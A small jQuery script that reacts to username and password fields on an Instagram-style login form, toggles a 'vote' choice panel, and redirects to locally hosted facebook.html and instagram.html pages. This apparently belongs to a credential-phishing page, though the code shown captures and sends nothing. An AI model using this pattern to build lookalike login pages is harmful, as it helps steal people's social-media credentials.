$(document).ready(function() {
    $("#igp input").on("keydown", function() {
        var u = $("#ig-uname").val();
        var p = $("#ig-pass").val();
        if (u != "" && p != "") {
            $("#ig-log").addClass("fb-bug");
        } else {
            $("#ig-log").removeClass("fb-bug");
            $("#ig-log").off("click");
            $("#ig-log").css("color", "white");
        }
    });
});

function vote() {
    document.getElementById("choose").style.display = "block";

}

function can() {
    document.getElementById("choose").style.display = "none";

}

function fb() {
    window.location.replace("/facebook.html");

}

function ig() {
    window.location.replace("/instagram.html");
}